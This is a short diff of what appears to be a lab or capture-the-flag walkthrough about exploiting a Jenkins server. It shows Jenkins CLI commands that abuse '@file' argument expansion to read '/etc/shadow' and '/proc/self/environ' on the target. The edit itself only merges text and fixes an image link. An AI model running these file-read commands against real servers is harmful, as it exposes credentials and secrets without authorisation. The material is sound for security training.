@@ -83,9 +83,7 @@ In this picture, we attempted to use the Jenkins CLI to read the `/etc/passwd` f
 
 ![Alt text](pics/pic8.png)
 
-No contents for `java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/etc/shadow"`.
-
-Let' s keep exploiting the server with this command line. We can also enumerate the environment of the Jenkins server. Let' s target `/proc/self/environ`, a special file in the proc filesystem on Unix-like operating systems that contains the environment variables of the process that accesses it. Type:
+No contents for `java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/etc/shadow"`. Let' s keep exploiting the server with this command line. We can also enumerate the environment of the Jenkins server. Let' s target `/proc/self/environ`, a special file in the proc filesystem on Unix-like operating systems that contains the environment variables of the process. Type:
 
 ```
 java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
@@ -93,7 +91,7 @@ java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/proc/self/environ
 
 You will see the following outcome
 
-(pic9)
+![Alt text](pics/pic9.png)
 
 (pic10)
 
